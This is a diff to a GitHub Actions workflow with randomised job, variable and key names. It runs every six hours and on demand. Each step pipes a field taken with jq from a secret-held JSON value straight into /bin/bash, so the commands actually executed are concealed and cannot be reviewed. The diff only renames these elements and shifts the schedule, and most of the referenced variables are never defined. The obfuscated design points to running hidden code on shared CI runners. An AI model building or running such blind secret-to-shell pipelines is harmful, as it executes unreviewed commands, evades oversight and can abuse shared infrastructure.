@@ -1,9 +1,8 @@
 name: chengyihai2603
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '27 3/6 * * *'
 
 jobs:
   build:
@@ -12,24 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengyihai2603
         env:
-          zcjvn53: ${{ secrets.zcjvn53 }}
+          v7935: ${{ secrets.v7935 }}
         run: |
-          echo $zcjvn53 | jq -r .kmhva05 | /bin/bash
-          echo $pzlqa16922 | jq -r .fhihn5 | /bin/bash
-          echo $sjl945 | jq -r .oxtz6432 | /bin/bash
-          echo $gwo93297 | jq -r .txs38 | /bin/bash
-          echo $pb00 | jq -r .zm51053 | /bin/bash
-          echo $riwmx61354 | jq -r .hfb1 | /bin/bash
-          echo $lj47296 | jq -r .y17 | /bin/bash
-          echo $hwod08 | jq -r .qinv8 | /bin/bash
-          echo $bj4 | jq -r .xfdv616 | /bin/bash
-          echo $p48179 | jq -r .oezn26963 | /bin/bash
-          echo $qqag12758 | jq -r .we43576 | /bin/bash
-          echo $uaoq27205 | jq -r .il78513 | /bin/bash
-          echo $ev25146 | jq -r .ey72 | /bin/bash
-          echo $cokb1 | jq -r .t68 | /bin/bash
-          echo $zk99 | jq -r .nwxnf5003 | /bin/bash
-          echo $ew101 | jq -r .a34 | /bin/bash
-          echo $xg7 | jq -r .d60 | /bin/bash
-          echo $ur4960 | jq -r .he8604 | /bin/bash
+          echo $v7935 | jq -r .hdked47165 | /bin/bash
+          echo $i53404 | jq -r .tonre4115 | /bin/bash
+          echo $ib28 | jq -r .s2 | /bin/bash
+          echo $umcd1652 | jq -r .ag18647 | /bin/bash
+          echo $unwfh69754 | jq -r .y31270 | /bin/bash
+          echo $yqt6 | jq -r .lw8 | /bin/bash
+          echo $uifo72415 | jq -r .nx1807 | /bin/bash
+          echo $c9997 | jq -r .hb8856 | /bin/bash
+          echo $jsbkw8 | jq -r .flez36 | /bin/bash
+          echo $m8706 | jq -r .bc9 | /bin/bash
+          echo $f3106 | jq -r .vz01157 | /bin/bash
+          echo $bag28416 | jq -r .bqkv19 | /bin/bash
+          echo $rmyiv64848 | jq -r .it547 | /bin/bash
 
